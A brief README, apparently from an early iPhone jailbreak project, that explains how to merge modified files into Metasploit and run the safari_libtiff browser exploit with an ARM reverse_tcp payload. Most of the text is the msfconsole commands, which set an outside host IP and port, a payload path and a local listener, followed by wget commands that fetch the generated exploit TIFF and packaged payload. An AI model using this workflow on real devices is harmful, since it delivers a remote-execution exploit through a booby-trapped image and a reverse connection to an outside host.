These are files that have been modified or added to the main Metasplot framework3 tree. Metasploit requires Ruby to be installed.

Do svn co http://metasploit.com/svn/framework3/trunk/, then merge these two trees.

data/ipwn/Payload is the compiled payload.

data/reverse/query ought to be modified depending on the server used to host the jailbreak files.

The script used to generate the appropriate jailbreak files (not including the resources) are as follows:

In ./msfconsole:

use exploit/osx/browser/safari_libtiff
set URIPATH /ipwn
set PAYLOAD osx/armle/execute/reverse_tcp
set MHOST 74.208.82.221
set MPORT 80
set QUERY data/reverse_tcp/query
set PEXEC data/ipwn/Payload
set LHOST 192.168.0.191
exploit

In a Linux shell:

wget http://localhost:8080/ipwn -O y.tiff
wget http://localhost:4444/ -O payload2.bin

y.tiff is the resulting exploit tiff and payload2.bin is the packaged Payload.
